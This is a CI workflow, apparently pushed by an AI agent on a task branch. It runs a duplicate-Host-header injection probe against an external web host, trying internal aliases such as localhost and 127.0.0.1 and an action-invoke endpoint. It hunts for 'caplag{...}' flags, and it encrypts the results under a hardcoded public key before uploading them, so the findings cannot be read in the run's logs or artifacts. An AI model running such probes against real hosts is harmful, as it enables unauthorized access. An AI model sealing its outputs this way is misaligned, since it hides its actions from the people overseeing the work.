name: launchlet-part3-duphost

on:
  push:
    branches: [agent/launchlet-part3-duphost-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe duplicate Host first/last parsing and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import socket,ssl,json,pathlib,re
          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          alts=['preview-8b11c','localhost','127.0.0.1','internal','launchlet-internal','deploy','preview','launchlet-demo-board','preview-8b11c.caplag-task.ru']
          body=json.dumps({'actionId':'act_6f4b9a2c1d0e8a71','args':{'workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}}).encode()
          reqs=[]
          for alt in alts:
            for order in [(host,alt),(alt,host)]:
              reqs.append(('GET /',alt,order, b'GET / HTTP/1.1\r\nHost: '+order[0].encode()+b'\r\nHost: '+order[1].encode()+b'\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n'))
              reqs.append(('POST action',alt,order, b'POST /api/actions/invoke HTTP/1.1\r\nHost: '+order[0].encode()+b'\r\nHost: '+order[1].encode()+b'\r\nContent-Type: application/json\r\nAccept: application/json\r\nX-Launchlet-Preview: launchlet-demo-board\r\nContent-Length: '+str(len(body)).encode()+b'\r\nConnection: close\r\n\r\n'+body))
          results=[];ctx=ssl.create_default_context()
          for kind,alt,order,req in reqs:
            try:
              raw=socket.create_connection((host,443),timeout=6); ss=ctx.wrap_socket(raw,server_hostname=host); ss.settimeout(6); ss.sendall(req); chunks=[]
              while True:
                try:c=ss.recv(65536)
                except socket.timeout:break
                if not c:break
                chunks.append(c)
              ss.close();data=b''.join(chunks).decode('utf-8','replace')
              results.append({'kind':kind,'alt':alt,'hosts':order,'response':data})
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',data) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags:(out/'FOUND.txt').write_text(data);break
            except Exception as e:results.append({'kind':kind,'alt':alt,'hosts':order,'error':repr(e)})
          (out/'summary.json').write_text(json.dumps(results,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-duphost-encrypted
          path: artifact/
          retention-days: 1
